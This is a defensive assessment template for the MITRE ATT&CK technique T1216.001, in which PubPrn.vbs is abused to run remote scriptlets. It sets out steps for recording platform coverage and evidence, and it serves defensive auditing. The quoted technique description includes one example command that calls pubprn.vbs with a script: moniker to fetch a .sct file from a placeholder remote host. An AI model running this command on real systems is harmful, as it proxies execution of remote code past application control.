# PubPrn Technique Platform Profile

## Reference

- Technique: **T1216.001 — PubPrn**
- Platforms named in the source: Windows

Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is a Visual Basic script that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through the Windows Command Shell via <code>Cscript.exe</code>. For example, the following code publishes a printer within the specified domain: <code>cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com</code>. Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites. To do so, adversaries may set the second <code>script:</code> parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command is <code>pubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct</code>. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script. In later versions of Windows (10+), <code>PubPrn.vbs</code> has been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter to <code>LDAP://</code>, vice the <code>script:</code> moniker which could be used to reference remote code via HTTP(S).

## Platform profile

1. Record the platforms in scope and the versions actually deployed.
2. Compare the deployed platform surface against the platforms the source names.
3. Record where the platform provides a native control for the technique, and where it does not.
4. Record the configuration evidence for the native control, where one exists.
5. Record the gap where the platform provides no native control, and the compensating detection.
6. Record the platform version, because platform behaviour changes between versions.

## Evidence

- the platform and version inventory for the scoped estate;
- the configuration export or screenshot for the native control;
- the detection evidence where the platform provides none.

## Limitations

A technique entry describes a class of abuse across platforms. The platform-specific exposure is a property of the deployment, established only by inventory and configuration evidence.

## Source

- MITRE ATT&CK: https://attack.mitre.org/
- T1216.001: https://attack.mitre.org/techniques/T1216/001
- Reviewed: 2026-10-27
